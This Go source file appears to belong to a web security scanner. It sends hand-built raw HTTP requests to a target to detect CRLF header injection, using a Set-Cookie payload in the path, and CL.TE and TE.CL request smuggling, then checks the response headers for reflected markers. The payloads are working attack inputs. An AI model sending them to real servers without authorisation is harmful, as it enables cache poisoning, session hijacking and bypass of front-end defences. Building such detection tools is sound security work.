package astkit

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"net/http"
	"strings"
)

const defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

type TestType int

const (
	CRLF TestType = iota
	CLTE
	TECL
)

type HeaderTestingConfig struct {
	Client    *ASTkitClient
	UserAgent string
	Host      string
	Port      uint16
	Test      TestType
	Payload   string
}

func requestCookies(config *HeaderTestingConfig) ([]*http.Cookie, error) {
	url := MakeUrl(HTTP(Basic), config.Host)
	if config.Port == 443 || config.Port == 8443 {
		url = MakeUrl(HTTP(Secure), config.Host)
	}
	response, err := SendRequestHTTP(config.Client, http.MethodGet, url)
	if response == nil {
		return nil, fmt.Errorf("unable to send request to target: %s", err)
	}
	defer response.Body.Close()
	cookies := response.Cookies()
	if len(cookies) == 0 {
		return nil, fmt.Errorf("no cookies in response")
	}
	return cookies, nil
}

func setupRawHttpRequest(config HeaderTestingConfig) (string, error) {
	var rawHttpRequest string
	switch config.Test {
	case CRLF:
		if len(config.Payload) == 0 {
			return "", errors.New("no payload configured")
		}
		rawHttpRequest = "GET /favicon.ico%0d%0a" + config.Payload + " HTTP/1.1\r\n" +
			"Host: " + config.Host + "\r\n" +
			"User-Agent: " + config.UserAgent + "\r\n" +
			"Connection: close\r\n" +
			"\r\n"
	case CLTE:
		rawHttpRequest = "POST / HTTP/1.1\r\n" +
			"Host: " + config.Host + "\r\n" +
			"User-Agent:" + config.UserAgent + "\r\n" +
			"Connection: keep-alive\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 5\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"G"
	case TECL:
		rawHttpRequest = "POST / HTTP/1.1\r\n" +
			"Host: " + config.Host + "\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"5c\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 15\r\n" +
			"\r\n" +
			"x=1\r\n" +
			"0\r\n\r\n"
	default:
		return "", errors.New("unknown test type")
	}
	return rawHttpRequest, nil
}

func runTest(config HeaderTestingConfig, payload string) (string, error) {
	if len(config.UserAgent) == 0 {
		config.UserAgent = defaultUserAgent
	}
	tcpDial, err := net.Dial("tcp", fmt.Sprintf("%s:%d", config.Host, config.Port))
	if err != nil {
		return "", fmt.Errorf("could not connect to target: %s", err)
	}
	defer tcpDial.Close()
	rawRequest, err := setupRawHttpRequest(config)
	if err != nil {
		return "", fmt.Errorf("failed to setup raw HTTP request: %s", err)
	}
	count := 1
	for {
		_, err = tcpDial.Write([]byte(rawRequest)) // Send raw request to [config.Host]
		if err != nil {
			return "", fmt.Errorf("failed to send raw request: %s", err)
		}
		if config.Test == TECL && count != 2 {
			count++
		} else {
			break
		}
	}
	// Read response headers
	responseReader := bufio.NewReader(tcpDial)
	for {
		currentHeader, err := responseReader.ReadString('\n')
		if err != nil {
			break
		}
		if strings.Contains(currentHeader, payload) {
			var result strings.Builder
			switch config.Test {
			case TECL:
				result.WriteString("TECL")
			case CLTE:
				result.WriteString("CLTE")
			case CRLF:
				return fmt.Sprintf("Test cookie reflected in response: %s\n", payload), nil
			}
			result.WriteString(" test succeed\n")
			return result.String(), nil
		}
		if currentHeader == "\r\n" { // Response headers end here
			break
		}
	}
	return "", nil
}

func InjectCookie(config HeaderTestingConfig) (string, error) {
	cookies, err := requestCookies(&config)
	if err != nil {
		return "", err
	}
	cookieName := cookies[0].Name
	config.Payload = fmt.Sprintf("Set-Cookie:+%s=jzqvtyxkplra", cookieName)
	return runTest(config, config.Payload)
}

func RequestSmuggling(config HeaderTestingConfig) (string, error) {
	var key string
	switch config.Test {
	case TECL:
		key = "ASTK"
	case CLTE:
		key = "GPOST"
	default:
		return "", fmt.Errorf("unknown test type")
	}
	return runTest(config, key)
}
